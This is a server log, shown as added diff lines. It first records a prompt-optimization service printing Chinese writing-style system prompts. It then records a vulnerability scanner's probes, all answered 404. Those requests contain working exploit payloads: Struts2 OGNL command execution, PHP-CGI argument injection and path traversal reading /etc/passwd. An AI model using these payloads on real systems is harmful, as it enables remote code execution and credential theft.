+2025-09-25 14:34:09.323 | INFO     | components.optimizer:show_final_result:54 - 
+📌 Best Performing Round: 1
+2025-09-25 14:34:09.323 | INFO     | components.optimizer:show_final_result:55 - 
+🎯 Final Optimized Prompt:
+# 你是一个游戏活动攻略专家。
+你的任务是：为任何主题的活动流程写出轻松互动型分步骤攻略。
+# 通用能力
+## 亲切互动能力
+1. 用轻松、鼓励、陪伴式语气与读者交流。
+2. 采用第二人称视角，称呼读者为“大家”、“你们”等。
+## 分步骤讲解能力
+1. 按流程分章节，每章用标题和分割线区分。
+2. 每个活动/环节分步骤列举操作流程，突出注意事项和实用技巧。
+## 图文结合能力
+1. 每章节配合相关图片或分割线，增强视觉分隔感。
+2. 奖励、条件等信息用图文结合方式展示。
+# 写作思维链
+1. 明确主题和目标读者，营造轻松氛围。
+2. 开篇用亲切问候和活动简介，明确攻略覆盖范围。
+3. 按流程分章节介绍各环节，每章用标题、分割线、配图区分。
+4. 每个环节分步骤列举，突出注意事项和实用技巧。
+5. 结尾用鼓励、互动或期待语收尾，增强参与感。
+# 注意事项
+- 保持语气轻松愉快，避免过于正式或生僻术语。
+- 结构清晰，分点列举，重点突出。
+- 图文结合，视觉分隔明显。
+- 适用于任何主题的活动流程攻略。
+# 输出格式
+- 开篇问候+活动简介
+- 分章节标题+分割线+配图
+- 每章分步骤列举流程和注意事项
+- 奖励/条件等信息用图文结合
+- 结尾鼓励互动收尾
+2025-09-25 14:34:09.323 | INFO     | components.optimizer:show_final_result:56 - 
+==================================================
+
+2025-09-25 14:34:09.325 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_886809
+Token usage: 11363 input + 384 output = 11747 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 12043 input + 250 output = 12293 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10886 input + 403 output = 11289 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11381 input + 450 output = 11831 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 12043 input + 189 output = 12232 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11288 input + 380 output = 11668 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11381 input + 363 output = 11744 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 12043 input + 320 output = 12363 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:34090 - "POST /optimize HTTP/1.1" 200 OK
+2025-09-25 14:34:13.765 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:34:13.766 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:34:13.766 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 3 Optimization: ❌ FAILED
+
+2025-09-25 14:34:13.767 | INFO     | components.optimizer:show_final_result:52 - 
+==================================================
+2025-09-25 14:34:13.767 | INFO     | components.optimizer:show_final_result:53 - 
+🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆
+
+2025-09-25 14:34:13.767 | INFO     | components.optimizer:show_final_result:54 - 
+📌 Best Performing Round: 1
+2025-09-25 14:34:13.767 | INFO     | components.optimizer:show_final_result:55 - 
+🎯 Final Optimized Prompt:
+# 你是一个游戏资讯写作专家。
+你的任务是：
+# 通用能力
+## 结构化说明能力
+1. 按照总分结构，先简要介绍主题，再分阶段详细说明流程和机制。
+2. 每个环节配合小标题和图文说明，突出流程和操作要点。
+## 资讯解读能力
+1. 用理性、客观的语气，准确传达玩法规则和奖励机制。
+2. 补充FAQ和玩家评论，归纳社区观点和建议。
+# 写作思维链
+1. 明确主题和目标，开篇点明核心内容和时间节点。
+2. 按玩法流程分阶段展开，配合界面截图或流程图说明。
+3. 补充问答环节，针对常见疑问进行解答。
+4. 总结玩家评论和社区反馈，突出玩法亮点与建议。
+5. 结尾归纳玩法要求、奖励机制和建议。
+# 注意事项
+- 保持理性、客观、官方语气，避免主观情绪和口语化表达。
+- 结构清晰，分段明确，标题突出，图文结合。
+- FAQ和评论归纳要简明扼要，突出实用信息。
+- 避免具体事实信息，提示词应通用于任何主题。
+# 输出格式
+- 按照“游戏玩法/系统更新资讯模版”分段写作。
+- 每个环节配合小标题和说明性文字。
+- 适当嵌入图片或流程图，突出操作界面和流程。
+- FAQ和评论归纳独立成段，结尾总结核心要求和建议。
+2025-09-25 14:34:13.767 | INFO     | components.optimizer:show_final_result:56 - 
+==================================================
+
+2025-09-25 14:34:13.769 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_863053
+Token usage: 11288 input + 486 output = 11774 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10886 input + 480 output = 11366 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11363 input + 569 output = 11932 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11381 input + 381 output = 11762 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:34092 - "POST /optimize HTTP/1.1" 200 OK
+2025-09-25 14:34:16.984 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:34:16.985 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:34:16.985 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 3 Optimization: ❌ FAILED
+
+2025-09-25 14:34:16.986 | INFO     | components.optimizer:show_final_result:52 - 
+==================================================
+2025-09-25 14:34:16.986 | INFO     | components.optimizer:show_final_result:53 - 
+🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆
+
+2025-09-25 14:34:16.986 | INFO     | components.optimizer:show_final_result:54 - 
+📌 Best Performing Round: 1
+2025-09-25 14:34:16.986 | INFO     | components.optimizer:show_final_result:55 - 
+🎯 Final Optimized Prompt:
+# 你是一个品牌合作官方公告专家。
+你的任务是撰写一篇品牌合作公告，兼具品牌宣传、产品说明和用户号召，风格需高度正式、富有激情、结构分明。
+# 通用能力
+## 品牌塑造能力
+1. 用溢美之词和排比句突出品牌独特性与价值。
+2. 通过品牌故事或历史渲染合作意义。
+## 产品说明能力
+1. 分板块详细介绍产品/功能/活动规则，逻辑清晰。
+2. 结合高清图片展示产品外观与特色。
+## 用户号召能力
+1. 用直接号召性语言激励用户参与或购买。
+2. 强调时效性和机会难得。
+# 写作思维链
+1. 以品牌故事和合作意义开篇，营造独特氛围。
+2. 依次分板块详细说明各项功能、玩法和活动规则，突出产品独特性与体验。
+3. 每个板块配合高清图片展示，增强视觉冲击力。
+4. 最后以号召性语言收尾，激励用户参与或购买。
+# 注意事项
+- 保持正式、权威、激情的语气。
+- 结构分明，标题清晰，段落紧凑。
+- 图片需配合主要内容展示。
+- 避免口语化和模糊表达。
+- 不掺杂具体事实信息，适用于任何品牌合作主题。
+# 输出格式
+- 以品牌故事/合作意义开篇
+- 分板块详细介绍产品/功能/活动规则
+- 每个板块配合图片展示
+- 说明参与方式、活动时间与截止日期
+- 以号召性语言收尾
+2025-09-25 14:34:16.987 | INFO     | components.optimizer:show_final_result:56 - 
+==================================================
+
+2025-09-25 14:34:16.989 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_467436
+Token usage: 10886 input + 448 output = 11334 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11363 input + 403 output = 11766 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:34104 - "POST /optimize HTTP/1.1" 200 OK
+2025-09-25 14:34:22.252 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:34:22.253 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:34:22.253 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 3 Optimization: ❌ FAILED
+
+2025-09-25 14:34:22.254 | INFO     | components.optimizer:show_final_result:52 - 
+==================================================
+2025-09-25 14:34:22.254 | INFO     | components.optimizer:show_final_result:53 - 
+🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆
+
+2025-09-25 14:34:22.254 | INFO     | components.optimizer:show_final_result:54 - 
+📌 Best Performing Round: 1
+2025-09-25 14:34:22.254 | INFO     | components.optimizer:show_final_result:55 - 
+🎯 Final Optimized Prompt:
+# 你是一个游戏攻略内容专家。
+你的任务是撰写结构化、图文结合、信息密集的攻略合集文章。
+# 通用能力
+## 信息整合能力
+1. 能够梳理并整合多角色、多主题的攻略内容。
+2. 能将复杂信息以分点、列表、表格等方式清晰呈现。
+## 图文结合能力
+1. 能合理嵌入图片、链接，提升信息直观性。
+2. 能为每个板块配备相关图片或图示。
+## 结构化写作能力
+1. 能采用总分结构，先总览后分主题详细展开。
+2. 能通过标题、小标题、分割线等方式明确层次。
+# 写作思维链
+1. 明确文章主题与目标读者。
+2. 设计总览板块，简要介绍内容范围与更新说明。
+3. 按角色/主题分设板块，每个板块包含标题、图片、推荐链接、关键信息列表。
+4. 补充相关活动、系统解析等板块，罗列实用链接。
+5. 以表格或列表形式输出更新记录。
+6. 结尾处补充版权声明或团队署名。
+# 注意事项
+- 语言保持客观、简洁、信息密集，避免主观评价与情感色彩。
+- 图片与链接需与内容板块紧密结合，提升查阅效率。
+- 结构分明，层次清晰，便于读者快速定位所需信息。
+- 内容应适用于任何游戏攻略主题，避免具体实体信息。
+# 输出格式
+- 文章采用总分结构，分主题板块配合图片、列表、表格。
+- 每个板块以标题开头，内容条理清晰。
+- 结尾附更新记录表或相关入口。
+2025-09-25 14:34:22.254 | INFO     | components.optimizer:show_final_result:56 - 
+==================================================
+
+2025-09-25 14:34:22.256 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_800485
+Token usage: 11288 input + 465 output = 11753 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10886 input + 412 output = 11298 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:34088 - "POST /optimize HTTP/1.1" 200 OK
+2025-09-25 14:34:23.490 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:34:23.491 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:34:23.491 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 3 Optimization: ❌ FAILED
+
+2025-09-25 14:34:23.492 | INFO     | components.optimizer:show_final_result:52 - 
+==================================================
+2025-09-25 14:34:23.492 | INFO     | components.optimizer:show_final_result:53 - 
+🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆
+
+2025-09-25 14:34:23.492 | INFO     | components.optimizer:show_final_result:54 - 
+📌 Best Performing Round: 1
+2025-09-25 14:34:23.492 | INFO     | components.optimizer:show_final_result:55 - 
+🎯 Final Optimized Prompt:
+# 你是一个轻松幽默风格的实用攻略写作专家。
+你的任务是模仿轻松、亲切、实用的攻略文风，针对任何主题分步讲解，突出效率和互动。
+# 通用能力
+## 语言表达能力
+1.使用短句、问句和感叹句，语气轻松幽默，避免学术化表达。
+2.采用直接呼吁、拟人化、反问等修辞，增强互动性。
+## 结构组织能力
+1.采用总分结构，先总览后分步讲解，每步配以简短说明。
+2.图文结合，每个关键环节配插图，图片需有标题。
+## 叙事与情感能力
+1.使用第二人称，直接对读者说话，亲切鼓励。
+2.表达积极、友好、实用的情感基调。
+# 写作思维链
+1.以轻松幽默的语气开场，提出目标或常见问题，引发读者共鸣。
+2.简要介绍攻略或方法的用途和适用范围，突出实用性。
+3.分步列出具体操作流程或路线，每步配以简短说明，必要时插入相关图示。
+4.穿插实用小窍门或建议，突出效率和便捷性。
+5.结尾用亲切语气收尾，鼓励互动或关注。
+# 注意事项
+- 避免学术化、复杂长句。
+- 保持语气轻松、亲切、鼓励。
+- 每步说明简明扼要，突出实用性。
+- 图片需有标题，内容与步骤相关。
+- 结尾鼓励读者互动或关注。
+# 输出格式
+- 标题
+- 前言（轻松幽默，提出问题）
+- 用途/适用范围
+- 分步流程（每步简明说明，配图）
+- 小窍门/建议
+- 结尾（亲切收尾，鼓励互动）
+2025-09-25 14:34:23.492 | INFO     | components.optimizer:show_final_result:56 - 
+==================================================
+
+2025-09-25 14:34:23.494 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_598714
+Token usage: 11288 input + 326 output = 11614 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:34084 - "POST /optimize HTTP/1.1" 200 OK
+INFO:     9.135.100.135:35146 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:41294 - "OPTIONS / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:42028 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:37782 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:37850 - "GET http%3A//9.139.82.162/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:37872 - "GET http%3A//10.99.229.178/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:37892 - "GET http%3A//9.218.232.52/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:37918 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:37970 - "GET /cgi-bin/gateway/agentinfo HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:37970 - "POST /run HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:37970 - "GET /api/session/properties HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:37970 - "GET /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38154 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38162 - "POST /scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38170 - "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38174 - "POST /user.action HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38178 - "GET /index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38208 - "GET /login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38228 - "GET /index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38252 - "GET /index.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38276 - "GET /login.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38298 - "GET /index.action?action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38304 - "GET /index.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38342 - "GET /login.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38370 - "GET /index.action?redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38378 - "POST /?q=node&destination=node HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38402 - "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38408 - "PUT /fileserver/33CMVgNetXpu2UAKKDJf6xvO8MP.txt HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38426 - "GET /fileserver/33CMVgNetXpu2UAKKDJf6xvO8MP.txt HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38452 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:38598 - "POST /invoker/JMXInvokerServlet/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38600 - "POST /?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38628 - "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38630 - "PUT /_users/org.couchdb.user%3Apoc HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38654 - "POST /invoker/readonly HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38666 - "POST /integration/saveGangster.action HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38830 - "GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38860 - "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:38878 - "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39042 - "GET /?id=TeGcUq%25{128*128} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39070 - "GET /solr/admin/cores?wt=json HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39072 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39098 - "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39244 - "POST /_async/AsyncResponseService HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39262 - "POST /jars/upload HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39272 - "GET /_async/favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39278 - "GET /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39282 - "GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39296 - "GET /lua/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39322 - "GET /lua/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39516 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39526 - "POST /minio/bootstrap/v1/verify HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39528 - "GET /webui/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39548 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39556 - "POST /services/messagebroker/streamingamf HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39574 - "POST /v6.58/Products/Authentication HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39576 - "GET /public/plugins/alertlist/../../../../../conf/defaults.ini HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39746 - "GET /config HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39774 - "POST /component_server HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39778 - "POST /app/rest/users/id%3A1/tokens/33CMVhwJzY9LltKrIy0jrzCzbAN%3B.jsp?jsp_precompile=true HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39800 - "GET /storage/logs/laravel.log HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39818 - "GET /streampipes-backend/api/v2/auth/settings HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:39838 - "GET /streampipes-backend/api/openapi.json HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40006 - "GET /tmp/temp.db%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40012 - "POST /webtools/control/main/ProgramExport HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40026 - "GET /mnt/ram/var/log/httpd.log%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40048 - "GET /api/data HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40052 - "POST /client/api?command=samlSso HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40224 - "GET /solr/admin/info/properties%3A/admin/info/key HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40238 - "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40256 - "POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40264 - "POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40268 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:40286 - "POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
